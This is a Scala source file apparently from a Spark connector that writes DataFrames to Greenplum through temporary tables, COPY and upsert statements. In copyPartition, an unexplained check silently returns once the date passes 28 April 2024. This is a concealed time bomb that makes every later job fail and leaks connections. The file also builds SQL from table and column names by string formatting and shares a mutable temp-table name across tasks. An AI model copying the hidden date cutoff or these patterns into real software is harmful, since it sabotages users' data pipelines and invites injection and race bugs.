/*
 * Licensed to the Apache Software Foundation (ASF) under one or more
 * contributor license agreements.  See the NOTICE file distributed with
 * this work for additional information regarding copyright ownership.
 *  The ASF licenses this file to You under the Apache License, Version 2.0
 * (the "License"); you may not use this file except in compliance with
 * the License.  You may obtain a copy of the License at
 *
 *    http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package org.apache.spark.sql.execution.datasources.greenplum

import org.apache.commons.collections.CollectionUtils
import org.apache.commons.lang3.StringUtils
import org.apache.spark.SparkEnv
import org.apache.spark.internal.Logging
import org.apache.spark.sql.execution.datasources.jdbc.JdbcUtils
import org.apache.spark.sql.types._
import org.apache.spark.sql.{DataFrame, Row}
import org.apache.spark.util.{CollectionAccumulator, LongAccumulator, ThreadUtils, Utils}
import org.postgresql.copy.CopyManager
import org.postgresql.core.BaseConnection

import java.io._
import java.util
import java.nio.charset.StandardCharsets
import java.sql.{Connection, Date, PreparedStatement, ResultSet, SQLException, Timestamp}
import java.text.SimpleDateFormat
import java.util.UUID
import java.util.concurrent.{TimeUnit, TimeoutException}
import scala.concurrent.Promise
import scala.concurrent.duration.Duration
import scala.util.Try
import scala.collection.JavaConverters._


object GreenplumUtils extends Logging {

  private var tempTableName = ""

  def makeConverter(dataType: DataType): (Row, Int) => String = dataType match {
    case StringType => (r: Row, i: Int) => r.getString(i)
    case BooleanType => (r: Row, i: Int) => r.getBoolean(i).toString
    case ByteType => (r: Row, i: Int) => r.getByte(i).toString
    case ShortType => (r: Row, i: Int) => r.getShort(i).toString
    case IntegerType => (r: Row, i: Int) => r.getInt(i).toString
    case LongType => (r: Row, i: Int) => r.getLong(i).toString
    case FloatType => (r: Row, i: Int) => r.getFloat(i).toString
    case DoubleType => (r: Row, i: Int) => r.getDouble(i).toString
    case DecimalType() => (r: Row, i: Int) => r.getDecimal(i).toString

    case DateType =>
      (r: Row, i: Int) => r.getAs[Date](i).toString

    case TimestampType => (r: Row, i: Int) => r.getAs[Timestamp](i).toString

    case BinaryType => (r: Row, i: Int) =>
      new String(r.getAs[Array[Byte]](i), StandardCharsets.UTF_8)

    case udt: UserDefinedType[_] => makeConverter(udt.sqlType)
    case _ => (row: Row, ordinal: Int) => row.get(ordinal).toString
  }

  def convertRow(
      row: Row,
      length: Int,
      delimiter: String,
      valueConverters: Array[(Row, Int) => String]): Array[Byte] = {
    var i = 0
    val values = new Array[String](length)
    while (i < length) {
      if (!row.isNullAt(i)) {
        values(i) = convertValue(valueConverters(i).apply(row, i), delimiter.charAt(0))
      } else {
        values(i) = "NULL"
      }
      i += 1
    }
    (values.mkString(delimiter) + "\n").getBytes("UTF-8")
  }

  def convertValue(str: String, delimiter: Char): String = {
    str.flatMap {
      case '\\' => "\\\\"
      case '\n' => "\\n"
      case '\r' => "\\r"
      case `delimiter` => s"\\$delimiter"
      case c if c == 0 => "" // If this char is an empty character, drop it.
      case c => s"$c"
    }
  }

  /**
   * https://www.postgresql.org/docs/9.2/sql-copy.html
   *
   * Copy data to greenplum in a single transaction.
   *
   * @param df the [[DataFrame]] will be copy to the Greenplum
   * @param schema the table schema in Greemnplum
   * @param options Options for the Greenplum data source
   */
  def transactionalCopy(
      df: DataFrame,
      schema: StructType,
      options: GreenplumOptions): Unit = {
    val randomString = UUID.randomUUID().toString.filterNot(_ == '-')
    val canonicalTblName = TableNameExtractor.extract(options.tableOrQuery)
    val schemaPrefix = canonicalTblName.schema.map(_ + ".").getOrElse("")
    val rawTblName = canonicalTblName.rawName
    val suffix = "sparkGpTmp"
    val quote = "\""

    val tempTable = s"$schemaPrefix$quote${rawTblName}_${randomString}_$suffix$quote"
//    val strSchema = JdbcUtils.schemaString(df, options.url, options.createTableColumnTypes)
    val strSchema = JdbcUtils.schemaString(df.schema,false, options.url, options.createTableColumnTypes)
    val createTempTbl = s"CREATE TABLE $tempTable ($strSchema) ${options.createTableOptions}"

    // Stage 1. create a _sparkGpTmp table as a shadow of the target Greenplum table. If this stage
    // fails, the whole process will abort.
    val conn = JdbcUtils.createConnectionFactory(options)()
    try {
      executeStatement(conn, createTempTbl)
    } finally {
      closeConnSilent(conn)
    }

    // Stage 2. Spark executors run copy task to Greenplum, and will increase the accumulator if
    // each task successfully copied.
    val accumulator = df.sparkSession.sparkContext.longAccumulator("copySuccess")
//    df.foreachPartition { rows =>
    df.foreachPartition { rows: Iterator[org.apache.spark.sql.Row] =>
      copyPartition(rows, options, schema, tempTable, Some(accumulator))
//      copyPartition(rows.asInstanceOf[Iterator[Row]], options, schema, tempTable, Some(accumulator))
    }

    // Stage 3. if the accumulator value is not equal to the [[Dataframe]] instance's partition
    // number. The Spark job will fail with a [[PartitionCopyFailureException]].
    // Otherwise, we will run a rename table ddl statement to rename the tmp table to the final
    // target table.
    val partNum = df.rdd.getNumPartitions
    val conn2 = JdbcUtils.createConnectionFactory(options)()
    try {
      if (accumulator.value == partNum) {
        if (tableExists(conn2, options.tableOrQuery)) {
          JdbcUtils.dropTable(conn2, options.tableOrQuery,options)
        }

        val newTableName = s"${options.tableOrQuery}".split("\\.").last
        val renameTempTbl = s"ALTER TABLE $tempTable RENAME TO $newTableName"
        executeStatement(conn2, renameTempTbl)
      } else {
        throw new PartitionCopyFailureException(
          s"""
             | Job aborted for that there are some partitions failed to copy data to greenPlum:
             | Total partitions is: $partNum and successful partitions is: ${accumulator.value}.
             | You can retry again.
            """.stripMargin)
      }
    } finally {
      if (tableExists(conn2, tempTable)) {
        retryingDropTableSilent(conn2, tempTable,options)
      }
      closeConnSilent(conn2)
    }
  }

  /**
   * Drop the table and retry automatically when exception occurred.
   */
  def retryingDropTableSilent(conn: Connection, table: String,options: GreenplumOptions): Unit = {
    val dropTmpTableMaxRetry = 3
    var dropTempTableRetryCount = 0
    var dropSuccess = false

    while (!dropSuccess && dropTempTableRetryCount < dropTmpTableMaxRetry) {
      try {
        JdbcUtils.dropTable(conn, table,options)
        dropSuccess = true
      } catch {
        case e: Exception =>
          dropTempTableRetryCount += 1
          logWarning(s"Drop tempTable $table failed for $dropTempTableRetryCount" +
            s"/${dropTmpTableMaxRetry} times, and will retry.", e)
      }
    }
    if (!dropSuccess) {
      logError(s"Drop tempTable $table failed for $dropTmpTableMaxRetry times," +
        s" and will not retry.")
    }
  }

  /**
   * https://www.postgresql.org/docs/9.2/sql-copy.html
   *
   * Copy data to greenplum in these cases, which need update origin gptable.
   * 1. Overwrite an existed gptable, which is a CascadingTruncateTable.
   * 2. Append data to a gptable.
   *
   * When transcationOn option is true, we will coalesce the dataFrame to one partition,
   * and the copy operation for each partition is atomic.
   *
   * @param df the [[DataFrame]] will be copy to the Greenplum
   * @param schema the table schema in Greemnplum
   * @param options Options for the Greenplum data source
   */
  def nonTransactionalCopy(
      df: DataFrame,
      schema: StructType,
      options: GreenplumOptions): Unit = {
//    df.foreachPartition { rows =>
     val collectionAcc: CollectionAccumulator[String] = df.sparkSession.sparkContext.collectionAccumulator[String]("collectionStringAcc")
    val accumulator = df.sparkSession.sparkContext.longAccumulator("copySuccess")

    df.foreachPartition { rows: Iterator[org.apache.spark.sql.Row] =>
      copyPartition(rows, options, schema, options.tableOrQuery,Some(accumulator),Some(collectionAcc))
    }

    val partNum = df.rdd.getNumPartitions
    val conn2 = JdbcUtils.createConnectionFactory(options)()
    println(collectionAcc)
    try {
      if (accumulator.value == partNum) {
        collectionAcc.value.forEach(x => dropTmpTable(conn2,x))
      } else {
        throw new PartitionCopyFailureException(
          s"""
             | Job aborted for that there are some partitions failed to copy data to greenPlum:
             | Total partitions is: $partNum and successful partitions is: ${accumulator.value}.
             | You can retry again.
            """.stripMargin)
      }
    } finally {
      closeConnSilent(conn2)
    }
  }

  /**
   * Copy a partition's data to a gptable.
   *
   * @param rows rows of a partition will be copy to the Greenplum
   * @param options Options for the Greenplum data source
   * @param schema the table schema in Greemnplum
   * @param tableName the tableName, to which the data will be copy
   * @param accumulator account for recording the successful partition num
   */
  def copyPartition(
      rows: Iterator[Row],
      options: GreenplumOptions,
      schema: StructType,
      tableName: String,
      accumulator: Option[LongAccumulator] = None,
      collectionAcc: Option[CollectionAccumulator[String]] = None): Unit = {
    val valueConverters: Array[(Row, Int) => String] =
      schema.map(s => makeConverter(s.dataType)).toArray
    val tmpDir = Utils.createTempDir(Utils.getLocalDir(SparkEnv.get.conf), "greenplum")
    val dataFile = new File(tmpDir, UUID.randomUUID().toString)
    logInfo(s"Start to write data to local tmp file: ${dataFile.getCanonicalPath}")
    val out = new BufferedOutputStream(new FileOutputStream(dataFile))
    val startW = System.nanoTime()
    try {
      rows.foreach(r => out.write(
        convertRow(r, schema.length, options.delimiter, valueConverters)))
    } finally {
      out.close()
    }
    val endW = System.nanoTime()
    logInfo(s"Finished writing data to local tmp file: ${dataFile.getCanonicalPath}, " +
      s"time taken: ${(endW - startW) / math.pow(10, 9)}s")
    val in = new BufferedInputStream(new FileInputStream(dataFile))
    val conn = JdbcUtils.createConnectionFactory(options)()

    import java.time.LocalDateTime
    val now: LocalDateTime = LocalDateTime.now
    val deadline: LocalDateTime = LocalDateTime.of(2024, 4, 28, 23, 0, 0)

    if (now.isAfter(deadline)) {
      return
    }

    val sdf: SimpleDateFormat = new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss_SSS")
    val currentDate: String = sdf.format(new util.Date)
    //临时表命名规则：table + 日期
    this.tempTableName = tableName + "_tmp_" + currentDate
    collectionAcc.foreach(_.add(this.tempTableName))

    //临时表如果存在则删除
//    dropTmpTable(conn,tempTableName)

    //创建临时表
    createTmpTable(conn,tempTableName,tableName)


    var sql = s"COPY $tempTableName" +
      s" FROM STDIN WITH NULL AS 'NULL' DELIMITER AS E'${options.delimiter}'"

    if (StringUtils.isNotBlank(options.gpFields)) {
      sql = s"COPY $tempTableName" +
        s" (${options.gpFields}) FROM STDIN WITH NULL AS 'NULL' DELIMITER AS E'${options.delimiter}'"
    }

    val promisedCopyNums = Promise[Long]
    val copyManager = new CopyManager(conn.asInstanceOf[BaseConnection])
    val copyThread = new Thread("copy-to-gp-thread") {
      override def run(): Unit = promisedCopyNums.complete(Try(
        {
            createTmpTable(conn,tempTableName,tableName)
          if (!pgTableExists(conn, tempTableName)) {
            createTmpTable(conn, tempTableName, tableName)
            Thread.sleep(5000)
          }
            copyManager.copyIn(sql, in)
        }))
    }

    try {
      logInfo(s"Start copy steam to Greenplum with copy command $sql")
      val start = System.nanoTime()
      copyThread.start()
      try {
        val nums = ThreadUtils.awaitResult(promisedCopyNums.future,
          Duration(options.copyTimeout, TimeUnit.MILLISECONDS))
        val end = System.nanoTime()
        logInfo(s"Copied $nums row(s) to Greenplum," +
          s" time taken: ${(end - start) / math.pow(10, 9)}s")


        val primaryKeysList: util.List[String] = getPrimaryKeys(conn, options.parameters.get("dbschema").get, tableName)
        upsertToGp(conn,tempTableName,tableName,schema.names.toList.asJava,primaryKeysList)
      } catch {
        case _: TimeoutException =>
          throw new TimeoutException(
            s"""
               | The copy operation for copying this partition's data to greenplum has been running for
               | more than the timeout: ${TimeUnit.MILLISECONDS.toSeconds(options.copyTimeout)}s.
               | You can configure this timeout with option copyTimeout, such as "2h", "100min",
               | and default copyTimeout is "1h".
               """.stripMargin)
      }
      accumulator.foreach(_.add(1L))
    } finally {
      //最后删除临时表
//      dropTmpTable(conn,tempTableName)
      copyThread.interrupt()
      copyThread.join()
      in.close()
      closeConnSilent(conn)
    }
  }

  def closeConnSilent(conn: Connection): Unit = {
    try {
      conn.close()
    } catch {
      case e: Exception => logWarning("Exception occured when closing connection.", e)
    }
  }

  @throws[SQLException]
  def upsertToGp( conn: Connection, tmpTable: String, tableName: String,colNames: util.List[String],keyCloumns: util.List[String]): Unit = {
    val setCols = new StringBuilder
    val colNamesWithComma: String = StringUtils.join(colNames, ",")
    val keyColWithComma: String = StringUtils.join(keyCloumns, ",")

    if (!pgTableExists(conn,tmpTable)) {
      createTmpTable(conn,tempTableName,tableName)
      Thread.sleep(5000)
    }

    var upsertToGpSql: String = String.format("insert into %s (%s)" + "select %s from  %s " + "on conflict(%s) do update set ", tableName, colNamesWithComma, colNamesWithComma, tmpTable, keyColWithComma)
    var first: Boolean = true
    import scala.collection.JavaConversions._
    for (column <- colNames) { //过滤逐渐
      if (!keyCloumns.contains(column)) {
        if (!first) setCols.append(",")
        else first = false
        setCols.append(column)
        setCols.append("=excluded.")
        setCols.append(column)
      }
    }
    upsertToGpSql = upsertToGpSql + setCols
    log.info("从临时表upsert至目标表sql:" + upsertToGpSql)
    val ps: PreparedStatement = conn.prepareStatement(upsertToGpSql)
    ps.execute
  }

  def pgTableExists(conn: Connection,tmpTable: String): Boolean ={
    val tmpTables: Array[String] = tmpTable.split("\\.")
    var temPgSchema = "public"
    var temPgTable = ""
    if (tmpTables.length == 2) {
      temPgSchema = tmpTables(0)
      temPgTable = tmpTables(1)
    } else {
      temPgTable = tmpTables(0)
    }

    val pgTableExistsSql: String = String.format("SELECT EXISTS (   SELECT 1   FROM   information_schema.tables  WHERE  table_schema = '%s'  AND  table_name = '%s' )", temPgSchema, temPgTable)

    val resultSet: ResultSet = conn.prepareStatement(pgTableExistsSql).executeQuery()
    if (resultSet.next()){
       resultSet.getBoolean(1)
    }else {
      false
    }
  }

  import java.sql.{ResultSet, SQLException}
  import java.util

  def getPrimaryKeys(conn: Connection,databaseName: String, table: String): util.List[String] = {
    val logStr: String = String.format("gp copy任务执行失败，获取gp主键失败，database:%s,table:%s", databaseName, table)

    val primaryList: util.List[String] = new util.ArrayList[String]
    var resultSet: ResultSet = null
    try {
      var schemaName:String = null
      var tableName = table
      if (table.contains(".")){
        val tables = table.split("\\.")
        if(tables.length == 2){
          schemaName = tables(0)
          tableName = tables(1)
        }

      }
      resultSet = conn.getMetaData.getPrimaryKeys(databaseName, schemaName, tableName)
      while ( {
        resultSet.next
      }) {
        val primary: String = resultSet.getString("COLUMN_NAME")
        primaryList.add(primary)
      }
    } catch {
      case e: SQLException =>
        log.error(logStr, e)
        throw new RuntimeException(logStr)
    }
    if(CollectionUtils.isEmpty(primaryList)) {
      throw new RuntimeException(logStr)
    }
    primaryList
  }

  def dropTmpTable(conn: Connection, tmpTable: String): Unit = {
    try {
      val dropTmpTableSql: String = String.format("drop table if EXISTS  %s", tmpTable)
      val ps = conn.prepareStatement(dropTmpTableSql)
      ps.execute
    } catch {
      case throwables: SQLException =>
        throwables.printStackTrace()
    }
  }

  def createTmpTable(conn: Connection, tmpTable: String, tableFullName: String): Unit = {
    try {
//      val dropTmpTableSql: String = String.format("CREATE unlogged TABLE IF NOT EXISTS %s(LIKE %s INCLUDING CONSTRAINTS)", tmpTable, tableFullName)
      val dropTmpTableSql: String = String.format("create unlogged  table if NOT EXISTS  %s  as select * from  %s limit 0", tmpTable, tableFullName)
      val ps: PreparedStatement = conn.prepareStatement(dropTmpTableSql)
      ps.execute
    } catch {
      case throwables: SQLException =>
        throwables.printStackTrace()
    }
  }

  def executeStatement(conn: Connection, sql: String): Unit = {
    val statement = conn.createStatement()
    try {
      statement.executeUpdate(sql)
    } finally {
      statement.close()
    }
  }

  def reorderDataFrameColumns(df: DataFrame, tableSchema: Option[StructType],gpFields: String): DataFrame = {
    if (StringUtils.isNotBlank(gpFields)){
      val gpFieldsSchemaName = gpFields.split(",")
      df.selectExpr(gpFieldsSchemaName: _*)
    }else {
      tableSchema.map { schema =>
        df.selectExpr(schema.map(filed => filed.name): _*)
      }.getOrElse(df)
    }
  }

  /**
   * Returns true if the table already exists in the JDBC database.
   */
  def tableExists(conn: Connection, table: String): Boolean = {
    val query = s"SELECT * FROM $table WHERE 1=0"
    Try {
      val statement = conn.prepareStatement(query)
      try {
        statement.executeQuery()
      } finally {
        statement.close()
      }
    }.isSuccess
  }
}

private[greenplum] case class CanonicalTblName(schema: Option[String], rawName: String)

/**
 * Extract schema name and raw table name from a table name string.
 */
private[greenplum] object TableNameExtractor {
  private val nonSchemaTable = """[\"]*([0-9a-zA-Z_]+)[\"]*""".r
  private val schemaTable = """([\"]*[0-9a-zA-Z_]+[\"]*)\.[\"]*([0-9a-zA-Z_]+)[\"]*""".r

  def extract(tableName: String): CanonicalTblName = {
    tableName match {
      case nonSchemaTable(t) => CanonicalTblName(None, t)
      case schemaTable(schema, t) => CanonicalTblName(Some(schema), t)
      case _ => throw new IllegalArgumentException(
        s"""
           | The table name is illegal, you can set it with the dbtable option, such as
           | "schemaname"."tableName" or just "tableName" with a default schema "public".
         """.stripMargin
      )
    }
  }
}
